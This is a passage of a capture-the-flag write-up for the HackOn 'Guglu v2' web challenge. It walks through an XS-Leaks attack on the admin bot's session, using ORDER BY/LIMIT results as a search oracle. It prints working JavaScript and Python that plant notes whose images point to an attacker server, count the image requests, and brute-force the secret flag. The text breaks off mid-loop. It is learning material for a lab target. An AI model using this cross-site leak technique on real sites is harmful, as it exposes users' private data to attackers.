<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">Flag</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.FLAG </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk4">'HackOn{fakeflag}'</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">`</span>
<span class="mtk4">            INSERT INTO posts (id, title, content,</span><span class="mtk4"> logo, creator)</span>
<span class="mtk4">            VALUES (0, ?, 'Boring post, anyway, on</span><span class="mtk4">ly I am reading it.',</span>
<span class="mtk4">            '</span><span class="mtk4 detected-link">https://cdn.vox-cdn.com/uploads/chorus_asset/file/</span><span class="mtk4 detected-link">22312759/rickroll_4k.jpg</span><span class="mtk4">',</span>  
<span class="mtk4">            'admin');</span>
<span class="mtk4">    `</span><span class="mtk1">).</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk1">Flag</span><span class="mtk1">);</span>
</code></pre></div><h3 id="bot">Bot</h3><p>The bot receives the URL of the web application to log in, and then accesses a URL that we give:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span><span class="mtk1"> { firefox } </span><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk4">"playwright-firefox"</span><span class="mtk1">;</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">USER</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"admin"</span><span class="mtk1">;</span>
<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">PASSWD</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk1">env</span><span class="mtk1">.PASSWD </span><span class="mtk5">??</span><span class="mtk1"> </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">"No password"</span><span class="mtk1">) </span><span class="mtk5">??</span><span class="mtk1"> </span><span class="mtk1">process</span><span class="mtk1">.</span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">sleep</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">msec</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span>
<span class="mtk1">  </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">((</span><span class="mtk8">resolve</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk7">setTimeout</span><span class="mtk1">(</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk9 mtki">msec</span><span class="mtk1">));</span>

<span class="mtk5">export</span><span class="mtk1"> </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">visit</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> (</span><span class="mtk9 mtki">chall_url</span><span class="mtk1">, </span><span class="mtk9 mtki">url</span><span class="mtk1">) </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk9 mtki">chall_url</span><span class="mtk1">)</span>
<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk4">/</span><span class="mtk5">^</span><span class="mtk4">https</span><span class="mtk5">?</span><span class="mtk4">:</span><span class="mtk6">\/\/</span><span class="mtk4">hackon-</span><span class="mtk6">[a-f0-9]</span><span class="mtk5">{12}</span><span class="mtk4">-guglu-</span><span class="mtk6">[0-9]</span><span class="mtk5">+</span><span class="mtk6">\.</span><span class="mtk4">chals</span><span class="mtk6">\.</span><span class="mtk4">io</span><span class="mtk6">\/</span><span class="mtk5">$</span><span class="mtk4">/</span><span class="mtk1">.</span><span class="mtk8">test</span><span class="mtk1">(</span><span class="mtk9 mtki">chall_url</span><span class="mtk1">)) {</span>  
<span class="mtk1">    </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">"Bad chall url"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">`chall_url: </span><span class="mtk5">${</span><span class="mtk9 mtki">chall_url</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">)</span>
<span class="mtk1">  </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">`url: </span><span class="mtk5">${</span><span class="mtk9 mtki">url</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> firefox.</span><span class="mtk8">launch</span><span class="mtk1">({</span>
<span class="mtk1">    </span><span class="mtk1">headless</span><span class="mtk1">: </span><span class="mtk6">true</span><span class="mtk1">,</span>
<span class="mtk1">    </span><span class="mtk1">firefoxUserPrefs</span><span class="mtk1">: {</span>
<span class="mtk1">      </span><span class="mtk4">"javascript.options.wasm"</span><span class="mtk1">: </span><span class="mtk6">false</span><span class="mtk1">,</span>
<span class="mtk1">      </span><span class="mtk4">"javascript.options.baselinejit"</span><span class="mtk1">: </span><span class="mtk6">false</span><span class="mtk1">,</span>
<span class="mtk1">    },</span>
<span class="mtk1">  });</span>

<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1">.</span><span class="mtk8">newContext</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">newPage</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">goto</span><span class="mtk1">(</span><span class="mtk9 mtki">chall_url</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk4">'login'</span><span class="mtk1">, { </span><span class="mtk1">timeout</span><span class="mtk1">: </span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1"> });</span>
<span class="mtk1">    </span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">type</span><span class="mtk1">(</span><span class="mtk4">'input[name=username]'</span><span class="mtk1">, </span><span class="mtk1">USER</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">type</span><span class="mtk1">(</span><span class="mtk4">'input[name=password]'</span><span class="mtk1">, </span><span class="mtk1">PASSWD</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">getByRole</span><span class="mtk1">(</span><span class="mtk4">'button'</span><span class="mtk1">).</span><span class="mtk8">click</span><span class="mtk1">();</span>

<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">goto</span><span class="mtk1">(</span><span class="mtk9 mtki">url</span><span class="mtk1">, { </span><span class="mtk1">timeout</span><span class="mtk1">: </span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1"> });</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">60</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">page</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">();</span>
<span class="mtk1">  } </span><span class="mtk5">catch</span><span class="mtk1"> (</span><span class="mtk1">e</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">error</span><span class="mtk1">(</span><span class="mtk1">e</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk1">browser</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk1">console</span><span class="mtk1">.</span><span class="mtk8">log</span><span class="mtk1">(</span><span class="mtk4">`end: </span><span class="mtk5">${</span><span class="mtk9 mtki">url</span><span class="mtk5">}</span><span class="mtk4">`</span><span class="mtk1">);</span>
<span class="mtk1">};</span>
</code></pre></div><p>The important thing here is that the bot will already have a session in the web application of the challenge, and if we try to look for the flag among its notes, it will come out. The key here is to find how to exfiltrate the flag.</p><h2 id="exfiltration-strategy">Exfiltration strategy</h2><p>As we control the URL to which the bot, the idea would be to build a server that hosts a web page that performs requests to <code>/search</code> with JavaScript. The problem is that we cannot read the response of these requests because the Same-Origin Policy.</p><p>Even so, there are a lot of contexts in which it is possible to exfiltrate information through an oracle. That is, if we find any difference between a response that has the <em>flag</em> and a response that does not, there we can try to exfiltrate. Many of these techniques are documented in <a href="https://xsleaks.dev">xsleaks.dev</a>.</p><p>If we deploy the Docker container with the web application and access the <code>admin</code> profile with the test credentials, we can see what changes if we look for the <em>flag</em> and what does not change:</p><p><img src="/images/other/HackOn%20CTF/Guglu-v2-1.webp" alt="Guglu v2 1"></p><p><img src="/images/other/HackOn%20CTF/Guglu-v2-2.webp" alt="Guglu v2 2"></p><p>For example, in the right case the image <code>rickroll.jpg</code> appears and in the wrong case it does not appear. An option would be to see if the image is cached when searching. If it is, it means that the search has given a result that coincides with the flag;and if it is not cached, it means that the search does not return the flag.</p><p>Thus, with a boolean oracle like this, we could try all possible characters for each flag index until it is correct.</p><h3 id="intended-approach">Intended approach</h3><p>Although the oracle based on the browser cache is good and suffices to exfiltrate, the intended way is in the use of <code>ORDER By title LIMIT 6</code> of the SQL query:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">function</span><span class="mtk1"> </span><span class="mtk8">searchPosts</span><span class="mtk1">(</span><span class="mtk9 mtki">query</span><span class="mtk1">, </span><span class="mtk9 mtki">owner</span><span class="mtk1">, </span><span class="mtk9 mtki">page</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk9 mtki">page</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">;</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk9 mtki">owner</span><span class="mtk1"> </span><span class="mtk5">===</span><span class="mtk1"> </span><span class="mtk4">"admin"</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"SELECT id, title, content, logo FROM posts WHERE </span><span class="mtk4">title LIKE ? ORDER BY title LIMIT 6 OFFSET ?;"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk4">`%</span><span class="mtk5">${</span><span class="mtk9 mtki">query</span><span class="mtk5">}</span><span class="mtk4">%`</span><span class="mtk1">, </span><span class="mtk1">offset</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1">;</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">db</span><span class="mtk1">.</span><span class="mtk8">prepare</span><span class="mtk1">(</span><span class="mtk4">"SELECT id, title, content, logo FROM posts WHERE </span><span class="mtk4">title LIKE ? and creator = ? ORDER BY title LIMIT </span><span class="mtk4">6 OFFSET ?;"</span><span class="mtk1">);</span>  
<span class="mtk1">        </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stmt</span><span class="mtk1">.</span><span class="mtk8">all</span><span class="mtk1">(</span><span class="mtk4">`%</span><span class="mtk5">${</span><span class="mtk9 mtki">query</span><span class="mtk5">}</span><span class="mtk4">%`</span><span class="mtk1">, </span><span class="mtk9 mtki">owner</span><span class="mtk1">, </span><span class="mtk1">offset</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">posts</span><span class="mtk1">;       </span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
</code></pre></div><p>The idea is that we create 6 notes with an image that points to our server and a title that begins with <code>HackOn{a</code>, then 6 notes that begin with <code>HackOn{b</code>, and so on until <code>HackOn{z</code>. So when we look for <code>HackOn{f</code>, the server will show the flag (<code>HackOn{fakeflag}</code>) along with <code>rickroll.jpg</code> and other 5 notes that start with <code>HackOn{f</code>. The key is that for the rest of the searches, our server will receive 6 requests for an image; but for the search that returns the <em>flag</em>, only 5 requests will arrive for an image.</p><h3 id="verification">Verification</h3><p>If we try it in SQLite, we will see that our premise is fulfilled, but in a detail:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">root@0a801a0ab2f7:/app# sqlite3 guglu.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite&gt; SELECT * FROM posts;
0|HackOn{fakeflag}|Boring post, anyway, only I am reading it.|https://cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg|admin  
sqlite&gt; INSERT INTO posts VALUES (1, 'HackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (2, 'HackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (3, 'HackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (4, 'HackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (5, 'HackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (6, 'HackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; SELECT * FROM posts;
0|HackOn{fakeflag}|Boring post, anyway, only I am reading it.|https://cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg|admin
1|HackOn{f|asdf|http://...|asdf
2|HackOn{f|asdf|http://...|asdf
3|HackOn{f|asdf|http://...|asdf
4|HackOn{f|asdf|http://...|asdf
5|HackOn{f|asdf|http://...|asdf
6|HackOn{f|asdf|http://...|asdf
sqlite&gt; SELECT id, title, content, logo FROM posts WHERE title LIKE '%HackOn{f%' ORDER BY title LIMIT 6 OFFSET 0;
1|HackOn{f|asdf|http://...
2|HackOn{f|asdf|http://...
3|HackOn{f|asdf|http://...
4|HackOn{f|asdf|http://...
5|HackOn{f|asdf|http://...
6|HackOn{f|asdf|http://...
</code></pre></div><p>As can be seen, if we put <code>HackOn{f</code> as title, it will always be shown before <code>HackOn{fakeflag}</code> because of <code>ORDER By title</code>. To fix it, we can simply put <code>ackOn{f</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">sqlite&gt; DELETE FROM posts WHERE id &gt; 0;
sqlite&gt; INSERT INTO posts VALUES (1, 'ackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (2, 'ackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (3, 'ackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (4, 'ackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (5, 'ackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; INSERT INTO posts VALUES (6, 'ackOn{f', 'asdf', 'http://...', 'asdf');
sqlite&gt; SELECT * FROM posts;
0|HackOn{fakeflag}|Boring post, anyway, only I am reading it.|https://cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg|admin  
1|ackOn{f|asdf|http://...|asdf
2|ackOn{f|asdf|http://...|asdf
3|ackOn{f|asdf|http://...|asdf
4|ackOn{f|asdf|http://...|asdf
5|ackOn{f|asdf|http://...|asdf
6|ackOn{f|asdf|http://...|asdf
sqlite&gt; SELECT id, title, content, logo FROM posts WHERE title LIKE '%ackOn{f%' ORDER BY title LIMIT 6 OFFSET 0;
0|HackOn{fakeflag}|Boring post, anyway, only I am reading it.|https://cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg
1|ackOn{f|asdf|http://...
2|ackOn{f|asdf|http://...
3|ackOn{f|asdf|http://...
4|ackOn{f|asdf|http://...
5|ackOn{f|asdf|http://...
</code></pre></div><p>And now it works as expected and we can use it as an oracle.</p><h3 id="implementation">Implementation</h3><p>The JavaScript code that will be executed on the page that the bot visits is the following:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">sleep</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk9 mtki">msec</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk7 mtki">Promise</span><span class="mtk1">(</span><span class="mtk8">resolve</span><span class="mtk1"> </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> </span><span class="mtk7">setTimeout</span><span class="mtk1">(</span><span class="mtk8">resolve</span><span class="mtk1">, </span><span class="mtk9 mtki">msec</span><span class="mtk1">));</span>  

<span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk8">leak</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> () </span><span class="mtk7 mtki">=&gt;</span><span class="mtk1"> {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">characters</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'abcdefghijklmnopqrstuvwxyz'</span>

<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">of</span><span class="mtk1"> </span><span class="mtk1">characters</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk7 mtki">const</span><span class="mtk1"> </span><span class="mtk1">w</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">open</span><span class="mtk1">(</span><span class="mtk4">'http://&lt;victim_url&gt;/search?query=ackOn{...'</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">await</span><span class="mtk1"> </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">500</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">w</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>

<span class="mtk8">leak</span><span class="mtk1">()</span>
</code></pre></div><p>It is a simple code that all it does is open a browser tab to perform the search, load the images and then close the tab, for each character that can be found in the flag in a given index.</p><p>With this, we can set up a Flask server that also manages the requests for the images and tells how many come for each character:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">hits</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Counter</span><span class="mtk1">()</span>


<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/image/&lt;i&gt;/&lt;c&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">])</span>  
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">image</span><span class="mtk1">(</span><span class="mtk9 mtki">i</span><span class="mtk1">, </span><span class="mtk9 mtki">c</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk1">hits</span><span class="mtk1">[</span><span class="mtk9 mtki">c</span><span class="mtk1">] </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk6">1</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">''</span>
</code></pre></div><p>The <code>&lt;i></code> parameter s important to prevent the browser from caching of the image because of having the same URL. Therefore, when adding the 6 notes per character, we also add the index:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">post_notes</span><span class="mtk1">(</span><span class="mtk9 mtki">title</span><span class="mtk1">: </span><span class="mtk8 mtku">str</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">6</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">victim_url</span><span class="mtk6">}</span><span class="mtk4">/add-post'</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">            </span><span class="mtk4">'title'</span><span class="mtk1">: </span><span class="mtk9 mtki">title</span><span class="mtk1">,</span>
<span class="mtk1">            </span><span class="mtk4">'content'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">,</span>
<span class="mtk1">            </span><span class="mtk4">'logo'</span><span class="mtk1">: </span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">vps_url</span><span class="mtk6">}</span><span class="mtk4">/image/</span><span class="mtk6">{</span><span class="mtk1">i</span><span class="mtk6">}</span><span class="mtk4">/</span><span class="mtk6">{</span><span class="mtk9 mtki">title</span><span class="mtk1">[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">]</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">,</span>  
<span class="mtk1">        })</span>
</code></pre></div><p>Thus, the main function of the script is as follows:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">global</span><span class="mtk1"> </span><span class="mtk1">flag</span>

<span class="mtk1">    </span><span class="mtk8 mtku">Thread</span><span class="mtk1">(</span><span class="mtk9 mtki">target</span><span class="mtk5">=</span><span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">, </span><span class="mtk9 mtki">kwargs</span><span class="mtk5">=</span><span class="mtk1">{</span>
<span class="mtk1">        </span><span class="mtk4">'debug'</span><span class="mtk1">: </span><span class="mtk6">False</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'host'</span><span class="mtk1">: </span><span class="mtk4">'0.0.0.0'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'port'</span><span class="mtk1">: </span><span class="mtk6">8000</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'use_reloader'</span><span class="mtk1">: </span><span class="mtk6">False</span><span class="mtk1">,</span>
<span class="mtk1">    }).</span><span class="mtk8">start</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">credentials</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk4">'username'</span><span class="mtk1">: </span><span class="mtk4">'asdf'</span><span class="mtk1">, </span><span class="mtk4">'password'</span><span class="mtk1">: </span><span class="mtk4">'fdsa'</span><span class="mtk1">}</span>
<span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">victim_url</span><span class="mtk6">}</span><span class="mtk4">/register'</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk5">=</span><span class="mtk1">credentials</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1">.</span><span class="mtk8">post</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">victim_url</span><span class="mtk6">}</span><span class="mtk4">/login'</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk5">=</span><span class="mtk1">credentials</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">flag</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'ackOn{'</span>
<span class="mtk1">    </span><span class="mtk1">flag_progress</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk4">'Flag'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk4">'}'</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">flag</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">string</span><span class="mtk1">.</span><span class="mtk1">ascii_lowercase</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk8">post_notes</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1">)</span>

<span class="mtk1">        </span><span class="mtk1">hits</span><span class="mtk1">.</span><span class="mtk8">clear</span><span class="mtk1">()</span>
